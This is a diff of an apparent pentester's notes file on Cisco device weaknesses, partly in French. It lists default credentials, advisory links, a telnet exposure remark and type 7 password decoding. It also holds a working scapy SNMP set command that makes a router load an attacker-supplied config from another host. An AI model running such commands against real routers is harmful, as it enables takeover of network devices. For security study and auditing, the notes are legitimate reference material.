@@ -17,9 +17,6 @@ snmp auth bypass due to hardcoded community string http://www.synacktiv.com/ress
 # get version of Cisco ASA OS
 /admin/exec/show+version
 
-./net-analyzer/vomit/vomit-0.2c.ebuild:DESCRIPTION="Converts a Cisco IP phone conversation into a wav file"
-enable.c # bruteforce enable
-
 # http-default-accounts.nse
   name = "Cisco 2811",
   category = "routers",
@@ -34,8 +31,8 @@ enable.c # bruteforce enable
     {username = "cisco", password = "cisco"}
 
 telnet est dispo depuis toutes les VRF (et non la VRF par defaut contrairement à ce que alain croyait)
-Donc il FAUT mettre une access-list sur le VTY sinon on peut faire telnet depuis Internet.
-Et aussi pourrir son syslog (port UDP en ecoute)
+donc il FAUT mettre une access-list sur le VTY sinon on peut faire telnet depuis Internet.
+et aussi pourrir son syslog (port UDP en ecoute)
 
 # vulns
 https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2009-002/?fid=3764
@@ -53,7 +50,7 @@ pull config: send(IP(src="10.200.0.77", dst="192.168.99.207")/UDP(dport=161)/SNM
 push config: send(IP(src="10.200.0.77", dst="192.168.99.207")/UDP(dport=161)/SNMP(community="private",PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.2.1.53.192.168.98.57"),value="pwnd-router.config")])))
 also see msf
 
-# decoding type 7 (vigenere cipher from 16th century)
+# decoding type 7 (vigenere cipher)
 cisco# conf t
 cisco(config)# key chain thisisatest
 cisco(config-keychain)# key 1
